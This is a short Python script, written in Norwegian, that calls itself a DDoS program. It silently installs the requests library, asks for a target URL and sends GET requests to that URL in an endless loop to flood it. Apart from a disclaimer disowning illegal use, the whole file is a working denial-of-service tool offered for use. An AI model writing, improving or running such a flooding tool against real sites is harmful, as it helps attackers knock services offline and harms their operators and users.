import os, sys
try:
	import requests
except ModuleNotFoundError:
	# installer uten å plage bruker
	os.system(f"{sys.executable} -m pip install requests --user")
	if "win" in sys.platform:
		e = "cls"
	else:
		e = "clear"
	os.system(e)
	del e
	import requests

print("Velkommen DDoS programmet!")
print("ADVARSEL! Ikke bruk dette på ulovelig vis under noen omstendigheter!")
print("Jeg er ikke på noen måte lovlig ansvarlig for konsekvenser av ditt bruk av dette programmet!\n")

url = input("Hva skal bli angrepet? ")
print(f"Angriper {url} nå!")
while True:
	print(requests.get(url).status_code)